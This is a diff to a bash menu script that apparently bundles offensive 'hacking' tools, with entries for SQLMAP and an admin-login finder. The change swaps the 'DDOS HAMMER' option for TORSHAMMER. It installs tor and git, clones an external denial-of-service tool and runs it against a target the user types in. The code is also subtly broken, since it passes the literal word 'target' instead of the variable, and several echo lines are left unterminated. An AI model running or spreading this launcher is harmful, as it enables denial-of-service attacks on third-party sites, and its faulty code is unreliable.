@@ -57,7 +57,7 @@ echo $cyan"  [10] SQLMAP                                 "
 echo "#####################################################"
 echo $green"  [11] ADMIN LOGIN                         "
 echo "#####################################################"
-echo $yellow"  [12] DDOS HAMMER                        "
+echo $yellow"  [12] TORSHAMMER                        "
 echo "#####################################################"
 echo $red"  [13] SQLMATE                                 "
 echo "#####################################################"
@@ -376,13 +376,16 @@ echo -e  "Contact  : 085726833815
 echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
 echo -e  "#############################################################"
 sleep 1
-echo $green"Installing DDOS HAMMER..."
+echo $green"Installing TORSHAMMER..."
 sleep 1
-git clone https://github.com/cyweb/hammer
-mv hammer $HOME
-cd $HOME/hammer
+apt update
+apt install git
+apt install tor
+git clone https://github.com/dotfighter/torshammer.git
+mv torshammer $HOME
+cd $HOME/torshammer
 read -p "Masukan Target:" target
-python2 hammer.py -T -t target
+python2 torshammer.py -T -t target
 fi
 
 if [ $bro = 13 ] || [ $bro = 13 ]
